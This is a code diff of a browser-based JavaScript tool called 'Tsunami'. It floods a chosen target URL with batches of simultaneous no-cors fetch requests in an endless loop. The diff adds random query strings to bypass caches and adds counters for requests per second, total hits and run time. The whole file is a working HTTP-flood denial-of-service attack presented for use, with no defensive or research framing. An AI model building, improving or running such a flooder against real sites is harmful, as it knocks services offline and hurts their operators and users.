@@ -1,11 +1,19 @@
 let ativo = false;
-let requisicoesEnviadas = 0;
-let rps = 0;
+let requisicoesNoSegundo = 0;
+let totalAcumulado = 0;
+let segundosPassados = 0;
+let intervaloTempo;
 
 function log(msg) {
     const logBox = document.getElementById('log');
     logBox.innerHTML += `<br>> ${msg}`;
     logBox.scrollTop = logBox.scrollHeight;
+}
+
+function formatarTempo(s) {
+    const min = Math.floor(s / 60).toString().padStart(2, '0');
+    const seg = (s % 60).toString().padStart(2, '0');
+    return `${min}:${seg}`;
 }
 
 async function toggleTsunami() {
@@ -20,44 +28,59 @@ async function toggleTsunami() {
     ativo = !ativo;
 
     if (ativo) {
+        // Reset e Início
+        totalAcumulado = 0;
+        segundosPassados = 0;
+        document.getElementById('total-hits').innerHTML = "0";
+        document.getElementById('timer').innerHTML = "00:00";
+        
         btn.innerHTML = "Parar Onda";
         btn.style.background = "#ff0000";
         document.getElementById('engine-status').innerHTML = "RUNNING";
         document.getElementById('engine-status').style.color = "#ff0000";
+        
         log(`ALVO TRAVADO: ${alvo}`);
-        log("INICIANDO INUNDAÇÃO...");
+        
+        // Inicia o cronômetro
+        intervaloTempo = setInterval(() => {
+            segundosPassados++;
+            document.getElementById('timer').innerHTML = formatarTempo(segundosPassados);
+            
+            // Atualiza RPS e limpa para o próximo segundo
+            document.getElementById('rps').innerHTML = requisicoesNoSegundo;
+            requisicoesNoSegundo = 0;
+        }, 1000);
+
         inundar(alvo);
     } else {
+        // Parar
         btn.innerHTML = "Iniciar Onda";
         btn.style.background = "#00ffff";
         document.getElementById('engine-status').innerHTML = "IDLE";
         document.getElementById('engine-status').style.color = "#00ffff";
-        log("ONDA ENCERRADA PELO USUÁRIO.");
+        clearInterval(intervaloTempo);
+        log("ONDA ENCERRADA.");
     }
 }
 
 async function inundar(url) {
     while (ativo) {
-        // Dispara lotes de 50 requisições simultâneas para não travar o celular de vez
-        const disparos = Array.from({ length: 200 }, () => 
-            fetch(url, { mode: 'no-cors', cache: 'no-store' })
-                .then(() => { requisicoesEnviadas++; })
-                .catch(() => { requisicoesEnviadas++; })
+        const lote = 50;
+        const disparos = Array.from({ length: lote }, () => 
+            fetch(`${url}?t=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' })
+                .then(() => { 
+                    requisicoesNoSegundo++; 
+                    totalAcumulado++; 
+                    document.getElementById('total-hits').innerHTML = totalAcumulado;
+                })
+                .catch(() => { 
+                    requisicoesNoSegundo++; 
+                    totalAcumulado++; 
+                    document.getElementById('total-hits').innerHTML = totalAcumulado;
+                })
         );
 
         await Promise.allSettled(disparos);
-        
-        // Pequena pausa para o navegador processar a interface
         await new Promise(r => setTimeout(r, 10)); 
     }
 }
-
-// Contador de RPS (Requisições por Segundo)
-setInterval(() => {
-    if (ativo) {
-        document.getElementById('rps').innerHTML = requisicoesEnviadas;
-        requisicoesEnviadas = 0;
-    } else {
-        document.getElementById('rps').innerHTML = "0";
-    }
-}, 1000);
